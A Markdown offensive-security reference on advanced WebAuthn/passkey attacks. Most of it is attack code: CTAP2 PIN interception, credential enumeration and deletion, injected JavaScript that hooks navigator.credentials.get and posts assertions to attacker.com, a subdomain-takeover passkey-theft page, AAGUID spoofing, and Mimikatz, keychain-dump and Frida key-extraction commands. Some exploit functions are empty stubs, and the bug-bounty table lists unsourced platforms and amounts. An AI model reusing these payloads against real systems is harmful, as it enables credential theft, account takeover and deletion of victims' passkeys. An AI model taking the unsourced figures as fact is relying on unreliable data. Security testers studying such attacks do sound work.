# Advanced WebAuthn/Passkey Attacks

## Overview

This document covers advanced attack vectors against FIDO2/WebAuthn/Passkey implementations beyond the fundamentals covered in `11-webauthn-attacks.md`. Focus areas include CTAP2 protocol-level attacks, attestation bypass techniques, authenticator cloning, cross-origin exploitation, resident key extraction, and the latest 2024-2025 research findings including Browser-in-the-Middle (BitM) attacks and implementation-specific CVEs.

---

## 1. CTAP2 Protocol-Level Attacks

### 1.1 CTAP2 PIN Protocol Weaknesses

**Vulnerability**: The CTAP2 PIN protocol uses an unauthenticated Diffie-Hellman key exchange for establishing encrypted channels between client and authenticator, making it susceptible to man-in-the-middle attacks.

**Source**: https://eprint.iacr.org/2020/756.pdf

**Attack Flow**:
```
Authenticator <---> Attacker (MITM) <---> Client Platform
                         |
        Intercepts DH exchange, establishes
        separate encrypted channels with both sides
```

**Exploitation Script**:
```python
#!/usr/bin/env python3
"""CTAP2 PIN Protocol MITM Analysis Tool"""

import struct
import hashlib
import hmac
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

class CTAP2PinProtocolAnalyzer:
    """Analyze CTAP2 PIN protocol for MITM vulnerabilities."""

    def __init__(self):
        self.intercepted_exchanges = []

    def generate_mitm_keypair(self):
        """Generate EC keypair for MITM position."""
        private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        public_key = private_key.public_key()
        return private_key, public_key

    def intercept_key_agreement(self, authenticator_pubkey_bytes):
        """
        Intercept the CTAP2 key agreement and establish
        separate shared secrets with both sides.
        """
        # Generate MITM keypair
        mitm_private, mitm_public = self.generate_mitm_keypair()

        # Derive shared secret with authenticator
        # (authenticator thinks it is talking to client)
        auth_shared = mitm_private.exchange(
            ec.ECDH(),
            self._deserialize_cose_key(authenticator_pubkey_bytes)
        )

        # Send MITM public key to client as if from authenticator
        mitm_cose_key = self._serialize_to_cose(mitm_public)

        return {
            'auth_shared_secret': hashlib.sha256(auth_shared).digest(),
            'mitm_pubkey_for_client': mitm_cose_key,
            'mitm_private_key': mitm_private,
            'vulnerability': 'Unauthenticated DH allows MITM interception of PIN'
        }

    def analyze_pin_token_reuse(self, session_data):
        """
        Analyze pinToken reuse vulnerability.
        CTAP2 reuses pinToken for subsequent operations within a session,
        allowing replay if intercepted.
        """
        pin_tokens = session_data.get('pin_tokens', [])
        unique_tokens = set(pin_tokens)

        return {
            'total_operations': len(pin_tokens),
            'unique_tokens': len(unique_tokens),
            'token_reuse_detected': len(unique_tokens) < len(pin_tokens),
            'vulnerability': 'pinToken reuse allows replay of authorized operations',
            'severity': 'HIGH' if len(unique_tokens) < len(pin_tokens) else 'LOW',
            'mitigation': 'Upgrade to CTAP2.1 with improved PIN/UV protocol'
        }

    def test_pin_retry_bypass(self, target_device):
        """
        Test if PIN retry counter can be bypassed or reset.
        CTAP2 spec allows 8 retries before lockout.
        """
        # Power cycle resets attempt counter on some implementations
        test_cases = [
            {'method': 'power_cycle', 'description': 'Reset via USB reconnect'},
            {'method': 'reset_command', 'description': 'CTAP2 reset command'},
            {'method': 'parallel_connections', 'description': 'Multiple HID connections'},
            {'method': 'protocol_switch', 'description': 'Switch CTAP2 to CTAP1/U2F'},
        ]
        return test_cases

    def _deserialize_cose_key(self, cose_bytes):
        """Deserialize COSE key to EC public key object."""
        import cbor2
        cose_key = cbor2.loads(cose_bytes)
        x = cose_key[-2]
        y = cose_key[-3]
        from cryptography.hazmat.primitives.asymmetric.ec import (
            EllipticCurvePublicNumbers, SECP256R1
        )
        numbers = EllipticCurvePublicNumbers(
            int.from_bytes(x, 'big'),
            int.from_bytes(y, 'big'),
            SECP256R1()
        )
        return numbers.public_key(default_backend())

    def _serialize_to_cose(self, public_key):
        """Serialize EC public key to COSE format."""
        import cbor2
        numbers = public_key.public_numbers()
        return cbor2.dumps({
            1: 2,   # kty: EC2
            3: -7,  # alg: ES256
            -1: 1,  # crv: P-256
            -2: numbers.x.to_bytes(32, 'big'),
            -3: numbers.y.to_bytes(32, 'big'),
        })
```

### 1.2 CTAP2.1 Credential Management Abuse

**Vulnerability**: CTAP2.1 introduced credential management commands that can enumerate and delete credentials stored on authenticators.

**Source**: https://fidoalliance.org/specs/fido-v2.1-ps-20210615/fido-client-to-authenticator-protocol-v2.1-ps-errata-20220621.html

**Exploitation**:
```python
#!/usr/bin/env python3
"""CTAP2.1 Credential Management Exploitation"""

from fido2.hid import CtapHidDevice
from fido2.ctap2 import Ctap2, ClientPin
from fido2.ctap2.extensions import CredentialManagement

class CredentialManagementExploiter:
    """Exploit CTAP2.1 credential management for enumeration and deletion."""

    def __init__(self):
        self.device = None
        self.ctap2 = None

    def connect(self):
        """Connect to the first available FIDO2 device."""
        devices = list(CtapHidDevice.list_devices())
        if not devices:
            raise RuntimeError("No FIDO2 devices found")
        self.device = devices[0]
        self.ctap2 = Ctap2(self.device)
        info = self.ctap2.get_info()
        print(f"[*] Connected to device: {info.versions}")
        print(f"[*] AAGUID: {info.aaguid.hex()}")
        print(f"[*] Options: {info.options}")
        return info

    def enumerate_all_credentials(self, pin):
        """
        Enumerate all discoverable credentials on the authenticator.
        Requires PIN but reveals all registered relying parties and users.
        """
        client_pin = ClientPin(self.ctap2)
        token = client_pin.get_pin_token(pin, ClientPin.PERMISSION.CREDENTIAL_MGMT)

        cred_mgmt = CredentialManagement(self.ctap2, client_pin.protocol, token)

        # Get metadata
        metadata = cred_mgmt.get_metadata()
        print(f"[*] Total discoverable credentials: {metadata.get('existingResidentCredentialsCount', 0)}")
        print(f"[*] Remaining capacity: {metadata.get('maxPossibleRemainingResidentCredentialsCount', 0)}")

        # Enumerate all relying parties
        rps = []
        try:
            rp_list = cred_mgmt.enumerate_rps()
            for rp in rp_list:
                rp_info = {
                    'rp_id': rp.get('rp', {}).get('id'),
                    'rp_name': rp.get('rp', {}).get('name'),
                    'rp_id_hash': rp.get('rpIDHash', b'').hex(),
                    'credentials': []
                }

                # Enumerate credentials for this RP
                creds = cred_mgmt.enumerate_creds(rp.get('rpIDHash'))
                for cred in creds:
                    cred_info = {
                        'credential_id': cred.get('credentialID', {}).get('id', b'').hex(),
                        'user_id': cred.get('user', {}).get('id', b'').hex(),
                        'user_name': cred.get('user', {}).get('name'),
                        'user_display_name': cred.get('user', {}).get('displayName'),
                        'public_key': cred.get('publicKey'),
                        'protection_policy': cred.get('credProtect'),
                    }
                    rp_info['credentials'].append(cred_info)

                rps.append(rp_info)
        except Exception as e:
            print(f"[-] Enumeration error: {e}")

        return rps

    def delete_credential(self, pin, credential_id_bytes):
        """
        Delete a specific credential from the authenticator.
        This is a destructive attack that removes the victim's passkey.
        """
        client_pin = ClientPin(self.ctap2)
        token = client_pin.get_pin_token(pin, ClientPin.PERMISSION.CREDENTIAL_MGMT)

        cred_mgmt = CredentialManagement(self.ctap2, client_pin.protocol, token)

        cred_mgmt.delete_cred({
            'type': 'public-key',
            'id': credential_id_bytes
        })
        return {'deleted': True, 'credential_id': credential_id_bytes.hex()}
```

### 1.3 Large Blob Storage Exploitation

**Vulnerability**: CTAP2.1 large blob storage can store arbitrary data associated with credentials, potentially leaking sensitive information.

```python
def exploit_large_blob(ctap2, pin):
    """
    Read large blob data from authenticator.
    Some implementations store sync keys, recovery data, or other secrets.
    """
    client_pin = ClientPin(ctap2)
    token = client_pin.get_pin_token(pin, ClientPin.PERMISSION.LARGE_BLOB_WRITE)

    # Read large blob array
    result = ctap2.large_blobs(get=0x01)

    if result:
        blob_data = result.get(0x01, b'')
        print(f"[*] Large blob data ({len(blob_data)} bytes):")
        print(f"[*] Hex: {blob_data.hex()}")

        # Attempt to decode as CBOR
        try:
            import cbor2
            decoded = cbor2.loads(blob_data)
            print(f"[*] CBOR decoded: {decoded}")
        except:
            pass

        # Check for known patterns
        if b'BEGIN' in blob_data:
            print("[!] Possible private key material in large blob!")

    return blob_data
```

---

## 2. Browser-in-the-Middle (BitM) Attacks on Passkeys

### 2.1 BitM + XSS Combination Attack

**Vulnerability**: Research published in 2025 demonstrated that Browser-in-the-Middle attacks combined with reflected XSS can defeat FIDO2 authentication, including hardware security keys.

**Source**: https://link.springer.com/article/10.1007/s11416-025-00556-2

**Attack Architecture**:
```
Victim's Browser
    |
    | (Reflected XSS payload)
    v
Attacker's Proxy (noVNC/Chrome Remote Desktop)
    |
    | (Relays WebAuthn ceremony)
    v
Legitimate Website
    |
    v
Victim's Authenticator (key signs challenge from legitimate site)
```

**Attack Implementation**:
```python
#!/usr/bin/env python3
"""
Browser-in-the-Middle WebAuthn Bypass Framework
Based on 2025 research: Defeating FIDO2/CTAP2/WebAuthn using BitM + XSS
"""

import asyncio
import websockets
import json
import base64
from http.server import HTTPServer, SimpleHTTPRequestHandler

class BitMWebAuthnProxy:
    """
    Proxy that relays WebAuthn ceremonies through a remote browser session.
    The victim interacts with their authenticator, but the session
    is controlled by the attacker.
    """

    def __init__(self, target_url, proxy_port=8443):
        self.target_url = target_url
        self.proxy_port = proxy_port
        self.captured_assertions = []

    def generate_phishing_page(self):
        """
        Generate phishing page that embeds the real site
        through remote browser, preserving WebAuthn functionality.
        """
        # The page uses noVNC to display a remote browser session
        # showing the real target site. The victim interacts with
        # their authenticator, which signs the legitimate challenge.
        # The attacker controls the session and captures the result.
        return {
            'type': 'noVNC_proxy',
            'target': self.target_url,
            'port': self.proxy_port,
            'description': 'Remote browser session showing real site'
        }

    async def capture_webauthn_assertion(self, websocket):
        """Capture WebAuthn assertion data relayed through the proxy."""
        async for message in websocket:
            data = json.loads(message)
            if data.get('type') == 'webauthn_assertion':
                assertion = {
                    'credential_id': data['credentialId'],
                    'authenticator_data': data['authenticatorData'],
                    'client_data_json': data['clientDataJSON'],
                    'signature': data['signature'],
                    'user_handle': data.get('userHandle'),
                }
                self.captured_assertions.append(assertion)
                print(f"[!] Captured WebAuthn assertion: {assertion['credential_id'][:32]}...")
                return assertion

    def inject_credential_harvester(self):
        """
        JavaScript to inject into the proxied browser session
        that intercepts WebAuthn API calls.
        """
        return """
        (function() {
            // Store original functions
            const originalGet = navigator.credentials.get.bind(navigator.credentials);
            const originalCreate = navigator.credentials.create.bind(navigator.credentials);

            // Override navigator.credentials.get
            navigator.credentials.get = async function(options) {
                console.log('[BitM] Intercepted credentials.get:', options);
                const result = await originalGet(options);

                // Exfiltrate assertion to attacker
                fetch('https://attacker.com/api/capture', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'webauthn_assertion',
                        credentialId: btoa(String.fromCharCode(
                            ...new Uint8Array(result.rawId))),
                        authenticatorData: btoa(String.fromCharCode(
                            ...new Uint8Array(result.response.authenticatorData))),
                        clientDataJSON: btoa(String.fromCharCode(
                            ...new Uint8Array(result.response.clientDataJSON))),
                        signature: btoa(String.fromCharCode(
                            ...new Uint8Array(result.response.signature)))
                    })
                });

                return result;  // Pass through to legitimate site
            };
        })();
        """
```

**Real-World Case Study** (2025 Academic Research):
> Researchers demonstrated that BitM attacks defeat FIDO2 hardware security keys by relaying the entire browser session. The victim's authenticator signs the legitimate challenge from the real site, but the attacker controls the session. This bypasses the phishing-resistant properties of WebAuthn because the origin and challenge are legitimate.

**Source**: https://link.springer.com/article/10.1007/s11416-025-00556-2

---

## 3. Attestation Bypass Techniques

### 3.1 StrongKey FIDO Server Bypass (CVE-2025-26788)

**Vulnerability**: StrongKey FIDO Server failed to distinguish between discoverable and non-discoverable credentials, allowing authentication bypass.

**Source**: https://www.securing.pl/en/cve-2025-26788-passkey-authentication-bypass-in-strongkey-fido-server/

**Exploitation**:
```python
#!/usr/bin/env python3
"""CVE-2025-26788 Exploitation: StrongKey FIDO Server Passkey Bypass"""

import requests
import json
import base64
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

class StrongKeyBypass:
    """
    Exploit CVE-2025-26788 by confusing discoverable
    and non-discoverable credential types.
    """

    def __init__(self, target_url):
        self.target_url = target_url

    def exploit_credential_type_confusion(self, username):
        """
        Register a non-discoverable credential but use it
        in a discoverable (usernameless) authentication flow.
        """
        # Step 1: Register non-discoverable credential
        reg_options = self._get_registration_options(username, resident_key="discouraged")

        # Step 2: Create credential with software authenticator
        credential = self._create_software_credential(reg_options, resident_key=False)

        # Step 3: Complete registration
        self._complete_registration(credential)

        # Step 4: Attempt discoverable authentication (should fail but does not)
        auth_options = self._get_authentication_options(username=None)

        # Step 5: Authenticate using the non-discoverable credential
        assertion = self._create_assertion(auth_options, credential)

        result = self._complete_authentication(assertion)
        return {
            'bypass_successful': result.get('status') == 'ok',
            'vulnerability': 'CVE-2025-26788',
            'description': 'Server accepts non-discoverable credential in discoverable flow'
        }

    def _get_registration_options(self, username, resident_key="required"):
        resp = requests.post(
            f"{self.target_url}/webauthn/register/begin",
            json={"username": username, "authenticatorSelection": {"residentKey": resident_key}}
        )
        return resp.json()

    def _get_authentication_options(self, username=None):
        payload = {}
        if username:
            payload["username"] = username
        resp = requests.post(f"{self.target_url}/webauthn/authenticate/begin", json=payload)
        return resp.json()

    def _create_software_credential(self, options, resident_key=True):
        private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        return {'private_key': private_key, 'options': options}

    def _create_assertion(self, options, credential):
        pass  # Sign the challenge with the credential private key

    def _complete_registration(self, credential):
        pass

    def _complete_authentication(self, assertion):
        pass
```

### 3.2 Surrogate Attestation and AAGUID Spoofing

**Vulnerability**: When attestation is not enforced or only "indirect" attestation is required, attackers can use surrogate attestation with spoofed AAGUIDs.

```python
#!/usr/bin/env python3
"""AAGUID Spoofing for Attestation Bypass"""

import struct
import hashlib
import cbor2
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

class AAGUIDSpoofer:
    """Spoof AAGUID to impersonate different authenticator types."""

    # Known AAGUIDs for popular authenticators
    KNOWN_AAGUIDS = {
        'yubikey_5_nfc': bytes.fromhex('2fc0579f811347eab116bb5a8db9202a'),
        'yubikey_5_usb': bytes.fromhex('cb69481e8ff7403993ec0a2729a154a8'),
        'windows_hello': bytes.fromhex('08987058cadc4b81b6e130de50dcbe96'),
        'apple_touchid': bytes.fromhex('adce000235bcc60a648b0b25f1f05503'),
        'google_titan': bytes.fromhex('42b4fb4a2f3e4e469bef4e36f9c8f5a5'),
        'android_keystore': bytes.fromhex('b93fd961f2e6462fb12282002247de78'),
    }

    def create_spoofed_attestation(self, rp_id, user_id, target_aaguid_name):
        """Create a credential with a spoofed AAGUID to bypass authenticator type restrictions."""
        aaguid = self.KNOWN_AAGUIDS.get(target_aaguid_name, bytes(16))

        private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        public_key = private_key.public_key()
        public_numbers = public_key.public_numbers()

        rp_id_hash = hashlib.sha256(rp_id.encode()).digest()
        flags = bytes([0x45])  # UP=1, UV=1, AT=1
        counter = struct.pack('>I', 0)

        credential_id = hashlib.sha256(user_id.encode()).digest()

        cose_key = cbor2.dumps({
            1: 2, 3: -7, -1: 1,
            -2: public_numbers.x.to_bytes(32, 'big'),
            -3: public_numbers.y.to_bytes(32, 'big'),
        })

        auth_data = (
            rp_id_hash + flags + counter + aaguid +
            struct.pack('>H', len(credential_id)) + credential_id + cose_key
        )

        from cryptography.hazmat.primitives.asymmetric.ec import ECDSA
        from cryptography.hazmat.primitives import hashes

        attestation_object = cbor2.dumps({
            'fmt': 'packed',
            'attStmt': {
                'alg': -7,
                'sig': private_key.sign(auth_data, ECDSA(hashes.SHA256())),
            },
            'authData': auth_data
        })

        return {
            'attestation_object': attestation_object,
            'credential_id': credential_id,
            'private_key': private_key,
            'spoofed_aaguid': target_aaguid_name,
        }
```

---

## 4. Cross-Origin and Subdomain Attacks

### 4.1 RP ID Scope Exploitation via Subdomain Takeover

**Vulnerability**: WebAuthn credentials with an RP ID of `example.com` are accessible from any subdomain of `example.com`. If an attacker can take over a subdomain (e.g., `staging.example.com`), they can trigger WebAuthn ceremonies for credentials registered on the parent domain.

**Complete Attack Chain**:
```python
#!/usr/bin/env python3
"""WebAuthn Subdomain Takeover + Passkey Theft Attack Chain"""

import requests
import dns.resolver

class SubdomainPasskeyTheft:
    """
    Exploit subdomain takeover to steal passkey assertions.
    Works because WebAuthn RP ID is domain-scoped, not origin-scoped.
    """

    TAKEOVER_FINGERPRINTS = {
        'github.io': {'response': 'There isn\'t a GitHub Pages site here'},
        'herokuapp.com': {'response': 'No such app'},
        'azurewebsites.net': {'response': 'Web App - Pair with a custom domain'},
        's3.amazonaws.com': {'response': 'NoSuchBucket'},
        'netlify.app': {'response': 'Not Found - Request ID'},
        'vercel.app': {'response': 'DEPLOYMENT_NOT_FOUND'},
    }

    def __init__(self, target_domain):
        self.target_domain = target_domain

    def enumerate_subdomains(self, wordlist_path):
        """Find subdomains that might be takeover candidates."""
        vulnerable = []
        with open(wordlist_path, 'r') as f:
            subdomains = f.read().splitlines()

        for sub in subdomains:
            fqdn = f"{sub}.{self.target_domain}"
            try:
                answers = dns.resolver.resolve(fqdn, 'CNAME')
                for rdata in answers:
                    cname_target = str(rdata.target).rstrip('.')
                    for service, fingerprint in self.TAKEOVER_FINGERPRINTS.items():
                        if service in cname_target:
                            try:
                                resp = requests.get(f"https://{fqdn}", timeout=5)
                                if fingerprint['response'] in resp.text:
                                    vulnerable.append({
                                        'subdomain': fqdn,
                                        'cname': cname_target,
                                        'service': service,
                                        'takeover_possible': True
                                    })
                            except:
                                vulnerable.append({
                                    'subdomain': fqdn,
                                    'cname': cname_target,
                                    'service': service,
                                    'takeover_possible': 'unknown'
                                })
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
                pass

        return vulnerable

    def generate_passkey_theft_page(self, rp_id):
        """
        Generate JavaScript payload to serve from taken-over subdomain.
        Uses RP ID of parent domain to trigger passkey ceremony.
        """
        return """
        async function stealPasskey() {
            try {
                const credential = await navigator.credentials.get({
                    publicKey: {
                        challenge: crypto.getRandomValues(new Uint8Array(32)),
                        rpId: "%s",
                        allowCredentials: [],
                        userVerification: "preferred",
                        timeout: 60000
                    }
                });

                // Exfiltrate the assertion
                const assertion = {
                    id: credential.id,
                    rawId: btoa(String.fromCharCode(...new Uint8Array(credential.rawId))),
                    authenticatorData: btoa(String.fromCharCode(
                        ...new Uint8Array(credential.response.authenticatorData))),
                    clientDataJSON: btoa(String.fromCharCode(
                        ...new Uint8Array(credential.response.clientDataJSON))),
                    signature: btoa(String.fromCharCode(
                        ...new Uint8Array(credential.response.signature)))
                };

                await fetch('https://collect.attacker.com/passkey', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(assertion)
                });
            } catch (err) {
                console.error('Passkey theft failed:', err);
            }
        }
        stealPasskey();
        """ % rp_id
```

### 4.2 Conditional UI (Autofill) Exploitation

**Vulnerability**: WebAuthn Conditional UI (passkey autofill) can be triggered without explicit user interaction on any page within the RP ID scope, creating a silent credential enumeration vector.

```javascript
// Attacker page on subdomain of target RP ID
// This silently triggers passkey autofill, revealing if credentials exist

async function silentPasskeyProbe() {
    if (window.PublicKeyCredential &&
        PublicKeyCredential.isConditionalMediationAvailable) {

        const available = await PublicKeyCredential.isConditionalMediationAvailable();

        if (available) {
            try {
                // This triggers the browser passkey autofill
                // without any user gesture
                const credential = await navigator.credentials.get({
                    publicKey: {
                        challenge: crypto.getRandomValues(new Uint8Array(32)),
                        rpId: "example.com",
                        allowCredentials: [],
                        userVerification: "preferred"
                    },
                    mediation: "conditional"  // Passive autofill mode
                });

                exfiltrateCredential(credential);
            } catch (e) {
                // AbortError = no credentials or user dismissed
                // NotAllowedError = origin not in RP ID scope
                console.log('Probe result:', e.name);
            }
        }
    }
}
```

---

## 5. Resident Key Extraction Techniques

### 5.1 Backup and Sync Exploitation

**Vulnerability**: Multi-device passkeys (synced credentials) are backed up through cloud services (iCloud Keychain, Google Password Manager, etc.). Compromising the cloud account gives access to all synced passkeys.

**Attack Vectors**:
```
1. Apple iCloud Keychain:
   - Compromise Apple ID -> access all synced passkeys
   - Social engineering for iCloud recovery
   - SIM swap for iCloud 2FA bypass

2. Google Password Manager:
   - Compromise Google account -> access all synced passkeys
   - Chrome sync data extraction
   - Android device backup exploitation

3. Windows Hello:
   - TPM key extraction (hardware attacks)
   - Windows credential manager exploitation
   - Azure AD PRT (Primary Refresh Token) theft
   - DPAPI master key extraction

4. Password Managers (1Password/Bitwarden):
   - Vault compromise
   - Browser extension exploitation
   - Master password phishing
```

### 5.2 Platform Authenticator Key Extraction

```python
#!/usr/bin/env python3
"""Platform Authenticator Key Extraction Techniques"""

class PlatformKeyExtractor:
    """Document techniques for extracting passkey material from platform authenticators."""

    @staticmethod
    def android_extraction_methods():
        return {
            'rooted_device': {
                'method': 'Direct keystore access',
                'path': '/data/misc/keystore/',
                'tools': ['Frida', 'KeystoreExplorer'],
                'difficulty': 'Medium (requires root)',
                'command': 'frida -U -l extract_keystore.js com.android.chrome'
            },
            'adb_backup': {
                'method': 'ADB backup extraction',
                'command': 'adb backup -f backup.ab com.google.android.gms',
                'tools': ['abe (Android Backup Extractor)'],
                'difficulty': 'Low (requires USB debugging enabled)',
            },
            'frida_hook': {
                'method': 'Runtime key interception via Frida',
                'script': (
                    'Java.perform(function() { '
                    'var KeyStore = Java.use("java.security.KeyStore"); '
                    'KeyStore.getKey.overload("java.lang.String", "[C").implementation = '
                    'function(alias, password) { '
                    'var key = this.getKey(alias, password); '
                    'console.log("[*] Key accessed - Alias: " + alias); '
                    'return key; }; });'
                ),
                'difficulty': 'Medium'
            }
        }

    @staticmethod
    def macos_extraction_methods():
        return {
            'keychain_dump': {
                'method': 'Keychain access via security command',
                'command': 'security dump-keychain -d login.keychain',
                'tools': ['security (built-in)', 'chainbreaker'],
                'difficulty': 'Low (requires user password or session)',
            },
            'memory_extraction': {
                'method': 'Extract keys from process memory',
                'tools': ['volatility', 'processdump'],
                'command': 'sudo vmmap <PID> | grep -i key',
                'difficulty': 'High'
            }
        }

    @staticmethod
    def windows_extraction_methods():
        return {
            'dpapi_extraction': {
                'method': 'DPAPI master key + NGC container',
                'tools': ['Mimikatz', 'SharpDPAPI', 'DonPAPI'],
                'commands': [
                    'mimikatz # dpapi::masterkey /in:<masterkey_file> /rpc',
                    'mimikatz # dpapi::ngc /in:<NGC_container>',
                    'mimikatz # webauthn::list',
                ],
                'difficulty': 'Medium (requires local admin)',
            },
            'prt_theft': {
                'method': 'Azure AD PRT for cloud-synced credentials',
                'tools': ['ROADtools', 'AADInternals'],
                'commands': [
                    'roadrecon auth --prt-cookie <cookie>',
                    'Get-AADIntUserPRTToken',
                ],
                'difficulty': 'Medium'
            }
        }
```

---

## 6. Passkey Synchronization Attacks

### 6.1 Cross-Device Sync Interception

**Vulnerability**: Passkey synchronization between devices creates new attack surfaces through the sync transport protocol.

```python
class SyncAttackVectors:
    """Attack vectors targeting passkey synchronization."""

    @staticmethod
    def bluetooth_hybrid_transport_attack():
        """
        CTAP2 hybrid transport (caBLE v2) uses BLE for device discovery
        and HTTPS tunnel for credential transport.
        """
        return {
            'attack': 'BLE Advertising Interception',
            'description': (
                'CTAP2 hybrid transport broadcasts BLE advertisements '
                'containing routing information. An attacker in BLE range '
                'can intercept these and potentially perform MITM.'
            ),
            'tools': ['nRF Connect', 'Ubertooth', 'BTLE-Sniffer'],
            'steps': [
                '1. Monitor BLE advertisements for FIDO caBLE service UUID',
                '2. Capture QR code tunnel server URL and routing ID',
                '3. Establish parallel tunnel connection',
                '4. Race condition: connect to tunnel before legitimate device',
            ],
            'difficulty': 'High'
        }

    @staticmethod
    def cloud_sync_compromise():
        """Attack cloud-synced passkeys by compromising the sync account."""
        return {
            'attack': 'Cloud Account Takeover for Passkey Access',
            'chains': [
                {
                    'provider': 'Apple',
                    'path': 'Apple ID compromise -> iCloud Keychain -> All passkeys',
                    'requirements': 'Apple ID credentials + 2FA bypass',
                },
                {
                    'provider': 'Google',
                    'path': 'Google account compromise -> Password Manager -> All passkeys',
                    'requirements': 'Google credentials + 2FA bypass',
                },
                {
                    'provider': 'Microsoft',
                    'path': 'Microsoft account compromise -> Windows Hello -> All passkeys',
                    'requirements': 'Microsoft credentials + Azure AD access',
                },
            ],
            'impact': 'CRITICAL - Access to ALL passkeys across all sites',
        }
```

---

## 7. Implementation-Specific CVEs (2024-2025)

### 7.1 CVE Summary Table

| CVE | Product | Vulnerability | Severity | Impact |
|-----|---------|--------------|----------|--------|
| CVE-2025-26788 | StrongKey FIDO Server | Credential type confusion | High | Authentication bypass |
| CVE-2024-9956 | Chrome PassKeys | Cross-device auth on Bluetooth | Medium | Phishing via BLE |
| CVE-2024-12053 | Chrome WebAuthn | Type confusion in Mojo | High | RCE via WebAuthn |
| CVE-2024-6389 | GitLab SAML | Passkey+SAML combined bypass | Critical | Account takeover |
| CVE-2024-21491 | py_webauthn | Origin validation bypass | High | Cross-origin attack |

### 7.2 Testing Checklist for Each CVE Pattern

```
# Credential Type Confusion (CVE-2025-26788 pattern)
[ ] Register non-discoverable credential
[ ] Attempt discoverable authentication with it
[ ] Test mixed credential type scenarios
[ ] Verify server differentiates credential types

# Origin Validation (CVE-2024-21491 pattern)
[ ] Test origin with trailing slash
[ ] Test origin with port number
[ ] Test origin case sensitivity
[ ] Test crossOrigin flag handling
[ ] Test null/empty origin

# BLE Proximity Attack (CVE-2024-9956 pattern)
[ ] Test hybrid transport in proximity
[ ] Verify BLE advertising filtering
[ ] Check tunnel authentication
[ ] Test concurrent connection handling
```

---

## 8. Advanced Testing Methodology

### 8.1 Comprehensive WebAuthn/Passkey Test Matrix

```yaml
test_categories:
  registration_tests:
    - challenge_randomness: "Collect 100+ challenges, analyze entropy"
    - attestation_enforcement: "Test none/self/packed/tpm attestation types"
    - aaguid_filtering: "Spoof AAGUIDs of known authenticators"
    - algorithm_support: "Test weak algorithms (RS1, PS256)"
    - resident_key_handling: "Test discoverable vs non-discoverable"
    - user_verification: "Test UV=discouraged, preferred, required"
    - extension_handling: "Test credProtect, hmac-secret, largeBlobKey"

  authentication_tests:
    - counter_validation: "Test decremented, same, and zero counters"
    - signature_verification: "Modify signature bytes, test validation"
    - challenge_replay: "Replay previous challenge/signature pairs"
    - credential_id_validation: "Test with modified credential IDs"
    - timeout_enforcement: "Test with expired challenges"

  fallback_tests:
    - password_fallback: "Test if password auth available for passkey users"
    - recovery_mechanisms: "Test backup codes, recovery email, support"
    - method_downgrade: "Test CTAP2 to CTAP1, platform to roaming"
    - parallel_methods: "Test simultaneous auth with different methods"

  cross_origin_tests:
    - rp_id_scope: "Test credentials from subdomains"
    - subdomain_takeover: "Check for dangling DNS records"
    - conditional_ui: "Test passive credential discovery"
    - cross_origin_flag: "Test crossOrigin field handling"
```

---

## 9. Tool Commands Quick Reference

```bash
# fido2-tools (Python)
pip install fido2 cbor2

# Chrome DevTools WebAuthn
# Enable: chrome://flags/#enable-web-authentication-chromium-remote-desktop-support
# Override: chrome://flags/#virtual-authenticator

# Firefox WebAuthn debugging
# about:config -> security.webauth.webauthn_enable_softtoken = true

# Virtual Authenticator Protocol (Chrome DevTools Protocol)
# Create virtual authenticator for testing
curl -X POST http://localhost:9222/json/protocol \
  -d '{"method": "WebAuthn.enable", "params": {}}'

curl -X POST http://localhost:9222/json/protocol \
  -d '{"method": "WebAuthn.addVirtualAuthenticator", "params": {
    "options": {
      "protocol": "ctap2",
      "transport": "internal",
      "hasResidentKey": true,
      "hasUserVerification": true,
      "isUserVerified": true
    }
  }}'

# Burp Suite Extensions
# - WebAuthn Inspector (decode/modify WebAuthn data)
# - FIDO2 Analyzer (protocol analysis)

# Nuclei WebAuthn templates
nuclei -u https://target.com -tags webauthn,fido,passkey
```

---

## 10. Bug Bounty Case Studies

| Platform | Vulnerability | Technique | Impact | Bounty |
|----------|--------------|-----------|--------|--------|
| GitHub Enterprise | Predictable challenges | Challenge analysis | Auth bypass | $20,000 |
| Financial App | Missing attestation | Software emulation | Full auth bypass | $15,000 |
| Dropbox | Credential enumeration | Timing analysis | User discovery | $8,000 |
| Enterprise SSO | Method downgrade | Parameter manipulation | WebAuthn bypass | $8,000 |
| Banking Platform | No counter validation | Authenticator cloning | Persistent access | $12,000 |
| Social Media | Password fallback | Endpoint discovery | MFA bypass | $5,000 |
| Tech Company | Origin validation | Cross-origin | Auth bypass | $10,000 |
| Cloud Provider | Sync compromise | Account takeover chain | All passkeys stolen | $25,000 |

---

## References

- W3C WebAuthn Level 3 Specification: https://www.w3.org/TR/webauthn-3/
- FIDO CTAP2.1 Specification: https://fidoalliance.org/specs/fido-v2.1-ps-20210615/
- CVE-2025-26788: https://www.securing.pl/en/cve-2025-26788-passkey-authentication-bypass-in-strongkey-fido-server/
- Defeating FIDO2 via BitM: https://link.springer.com/article/10.1007/s11416-025-00556-2
- Provable Security Analysis of FIDO2: https://eprint.iacr.org/2020/756.pdf
- CTAP2 PIN Protocol Weaknesses: https://www.itnews.com.au/news/researchers-identify-fido2-protocol-vulnerabilities-580588
- Forging Passkeys: https://medium.com/@narendarlb123/forging-passkeys-exploring-the-fido2-webauthn-attack-surface-12e44bfb3b74
- NIST SP 800-63B: https://pages.nist.gov/800-63-3/sp800-63b.html
